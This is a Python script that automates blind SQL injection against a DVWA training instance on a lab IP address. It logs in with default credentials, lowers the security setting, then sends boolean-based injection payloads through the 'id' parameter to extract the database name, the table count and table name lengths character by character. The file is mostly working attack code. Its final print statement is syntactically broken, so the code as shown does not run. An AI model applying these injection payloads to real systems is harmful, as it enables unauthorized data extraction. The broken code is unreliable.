#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup


s = requests.Session()

lista = 'abcdefghijklmnopqrstuvwxyz'

def dvwa_login():
    url = 'http://192.168.210.130/dvwa/login.php'
    params = {'username':'admin','password':'password','Login':'Login'}
    r = s.post(url=url, data=params)
    print("- Logged In.")

def dvwa_security():
    url = 'http://192.168.210.130/dvwa/security.php'
    params = {'security':'low','seclev_submit':'Submit'}
    r = s.post(url=url, data=params)
    print("- Security set to Low.")

def sql_blind():
    for i in range(1,10):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and length(database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("Database length is: " + i)
            break
    count = int(i)  

    db_name = ''
    for j in range(1,count+1):
        j = str(j)
        for c in lista:
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and mid(database(),{j},1)='{c}'-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                db_name = db_name+c
                print(db_name,end='\r')
    print("Database name: " + db_name)         
            

    for i in range(1,50):
        i = str(i)
        url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
        params = {"id":f"1' and (select count(table_name) from information_schema.tables where table_schema=database())={i}-- -","Submit":"Submit"}
        r = s.get(url=url, params=params)
        if "Surname" in r.text:
            print("Tables count: " + i)
            break
    count = int(i) 

    tbl_name = ''
    for tc in range(count):
        for i in range(1,30):
            url = "http://192.168.210.130/dvwa/vulnerabilities/sqli_blind/"
            params = {"id":f"1' and length((select table_name from information_schema.tables where table_schema=database() limit {tc},1))={i}-- -","Submit":"Submit"}
            r = s.get(url=url, params=params)
            if "Surname" in r.text:
                print(f"Length of table {i}: " + str(i)




def main():
    dvwa_login()
    dvwa_security()
    sql_blind()


if __name__=="__main__":
    main()

